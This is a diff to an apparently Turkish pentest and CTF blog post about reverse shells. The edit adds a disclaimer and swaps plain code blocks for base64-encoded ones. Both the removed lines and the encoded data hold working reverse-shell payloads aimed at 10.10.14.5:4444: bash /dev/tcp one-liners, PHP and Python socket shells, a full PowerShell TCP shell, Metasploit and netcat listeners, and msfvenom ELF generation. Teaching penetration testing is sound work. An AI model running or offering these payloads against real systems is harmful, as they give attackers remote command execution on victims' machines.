@@ -5,6 +5,8 @@ description: "Pentest ve CTF senaryolarında reverse shell almanın farklı yön
 tags: ["Pentest", "CTF"]
 ---
 
+<PayloadDisclaimer />
+
 ## Reverse Shell Nedir?
 
 Normal bir shell bağlantısında saldırgan hedef sisteme bağlanır (bind shell). Reverse shell'de ise hedef sistem **saldırgana** bağlanır. Bu yaklaşım, güvenlik duvarı kurallarını atlatmak için kritik önem taşır — çünkü çoğu firewall gelen bağlantıları filtreler, giden bağlantıları serbest bırakır.
@@ -17,27 +19,13 @@ Normal bir shell bağlantısında saldırgan hedef sisteme bağlanır (bind shel
 
 Payload çalıştırmadan önce kendi makinenizde dinleyiciyi açın:
 
-```bash
-# Netcat ile klasik listener
-nc -lvnp 4444
-
-# Rlwrap ile geliştirme (ok tuşları, history)
-rlwrap nc -lvnp 4444
-
-# Metasploit multi/handler
-msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; run"
-```
+<EncodedCodeBlock language="bash" data="IyBOZXRjYXQgaWxlIGtsYXNpayBsaXN0ZW5lcgpuYyAtbHZucCA0NDQ0CgojIFJsd3JhcCBpbGUgZ2VsacWfdGlybWUgKG9rIHR1xZ9sYXLEsSwgaGlzdG9yeSkKcmx3cmFwIG5jIC1sdm5wIDQ0NDQKCiMgTWV0YXNwbG9pdCBtdWx0aS9oYW5kbGVyCm1zZmNvbnNvbGUgLXEgLXggInVzZSBleHBsb2l0L211bHRpL2hhbmRsZXI7IHNldCBQQVlMT0FEIGxpbnV4L3g2NC9zaGVsbF9yZXZlcnNlX3RjcDsgc2V0IExIT1NUIDEwLjEwLjE0LjU7IHNldCBMUE9SVCA0NDQ0OyBydW4i" />
 
 ## Payload'lar
 
 ### Bash
 
-```bash
-bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
-
-# Alternatif — bazı sistemlerde daha güvenilir
-bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
-```
+<EncodedCodeBlock language="bash" data="YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQoKIyBBbHRlcm5hdGlmIOKAlCBiYXrEsSBzaXN0ZW1sZXJkZSBkYWhhIGfDvHZlbmlsaXIKYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMSc=" />
 
 ### Python
 
@@ -51,29 +39,11 @@ python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5"
 
 ### PHP
 
-```php
-<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"); ?>
-
-// Daha kapsamlı
-php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
-```
+<EncodedCodeBlock language="php" data="PD9waHAgc3lzdGVtKCJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjUvNDQ0NCAwPiYxJyIpOyA/PgoKLy8gRGFoYSBrYXBzYW1sxLEKcGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjEwLjE0LjUiLDQ0NDQpO2V4ZWMoIi9iaW4vc2ggLWkgPCYzID4mMyAyPiYzIik7Jw==" />
 
 ### PowerShell (Windows)
 
-```powershell
-$client = New-Object System.Net.Sockets.TCPClient("10.10.14.5", 4444)
-$stream = $client.GetStream()
-[byte[]]$bytes = 0..65535 | % { 0 }
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
-    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
-    $sendback = (iex $data 2>&1 | Out-String)
-    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
-    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
-    $stream.Write($sendbyte, 0, $sendbyte.Length)
-    $stream.Flush()
-}
-$client.Close()
-```
+<EncodedCodeBlock language="powershell" data="JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgiMTAuMTAuMTQuNSIsIDQ0NDQpCiRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpCltieXRlW11dJGJ5dGVzID0gMC4uNjU1MzUgfCAlIHsgMCB9CndoaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCkgewogICAgJGRhdGEgPSAoTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLlRleHQuQVNDSUlFbmNvZGluZykuR2V0U3RyaW5nKCRieXRlcywgMCwgJGkpCiAgICAkc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nKQogICAgJHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICJQUyAiICsgKHB3ZCkuUGF0aCArICI+ICIKICAgICRzZW5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkc2VuZGJhY2syKQogICAgJHN0cmVhbS5Xcml0ZSgkc2VuZGJ5dGUsIDAsICRzZW5kYnl0ZS5MZW5ndGgpCiAgICAkc3RyZWFtLkZsdXNoKCkKfQokY2xpZW50LkNsb3NlKCk=" />
 
 ## Shell'i Stabilize Etme
 
@@ -95,14 +65,7 @@ stty rows 38 cols 175
 
 Hızlı payload üretmek için `revshells.com` pratik olsa da **üretim ortamı IP'lerinizi** üçüncü parti sitelere girmekten kaçının. Bunun yerine:
 
-```bash
-# msfvenom ile özelleştirilmiş payload
-msfvenom -p linux/x64/shell_reverse_tcp \
-  LHOST=10.10.14.5 LPORT=4444 \
-  -f elf -o shell.elf
-
-chmod +x shell.elf && ./shell.elf
-```
+<EncodedCodeBlock language="bash" data="IyBtc2Z2ZW5vbSBpbGUgw7Z6ZWxsZcWfdGlyaWxtacWfIHBheWxvYWQKbXNmdmVub20gLXAgbGludXgveDY0L3NoZWxsX3JldmVyc2VfdGNwIFwKICBMSE9TVD0xMC4xMC4xNC41IExQT1JUPTQ0NDQgXAogIC1mIGVsZiAtbyBzaGVsbC5lbGYKCmNobW9kICt4IHNoZWxsLmVsZiAmJiAuL3NoZWxsLmVsZg==" />
 
 ## Tespit ve Savunma
 
